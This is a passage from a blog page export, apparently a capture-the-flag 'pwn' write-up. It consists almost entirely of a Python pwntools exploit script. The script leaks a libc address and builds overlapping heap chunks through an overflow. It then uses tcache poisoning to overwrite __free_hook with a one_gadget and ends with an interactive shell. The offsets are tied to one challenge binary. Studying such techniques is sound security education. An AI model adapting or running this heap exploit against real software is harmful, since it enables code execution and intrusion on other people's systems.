class=\"number\">2</span>)</span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc_addr = addr - <span class=\"number\">0x3ebd20</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"libc addr is \"</span> + hex(libc_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">one_gadget = libc_addr + <span class=\"number\">0x4f322</span></span><br><span class=\"line\">free_hook = libc_addr + libc.symbols[<span class=\"string\">'__free_hook'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">\"\\x00\"</span> * <span class=\"number\">0x60</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># make overlapping &amp; getshell</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x1f8</span>, <span class=\"string\">\"\\x80\"</span> * <span class=\"number\">0x1f8</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">add(<span class=\"number\">0x90</span>, <span class=\"string\">\"\\x80\"</span> * <span class=\"number\">0x90</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\">add(<span class=\"number\">0x280</span>, <span class=\"string\">\"\\x80\"</span> * <span class=\"number\">0x280</span>) <span class=\"comment\"># 6</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>, <span class=\"string\">\"\\x80\"</span>*<span class=\"number\">0x40</span>) <span class=\"comment\"># 7</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">\"\\x00\"</span> * <span class=\"number\">0x30</span>) <span class=\"comment\"># 9</span></span><br><span class=\"line\">dele(<span class=\"number\">6</span>) <span class=\"comment\"># kong 6</span></span><br><span class=\"line\">merge(<span class=\"number\">4</span>, <span class=\"number\">5</span>) <span class=\"comment\"># 6 make 7's size bigger</span></span><br><span class=\"line\">dele(<span class=\"number\">7</span>) <span class=\"comment\"># kong 7</span></span><br><span class=\"line\">dele(<span class=\"number\">9</span>) <span class=\"comment\"># kong 9 0x30 tcache</span></span><br><span class=\"line\">fake_chunk = <span class=\"string\">\"a\"</span>* <span class=\"number\">0x40</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x41</span>) + p64(free_hook) <span class=\"comment\"># overflow </span></span><br><span class=\"line\">add(<span class=\"number\">0x70</span>, fake_chunk.ljust(<span class=\"number\">0x70</span>, <span class=\"string\">\"\\x00\"</span>)) <span class=\"comment\"># 7</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x30</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, p64(one_gadget).ljust(<span class=\"number\">0x30</span>,<span class=\"string\">\"\\x00\"</span>)) <span class=\"comment\"># tcache poisoning</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":[{"name":"pwn","slug":"pwn","count":8,"path":"api/tags/pwn.json"}]}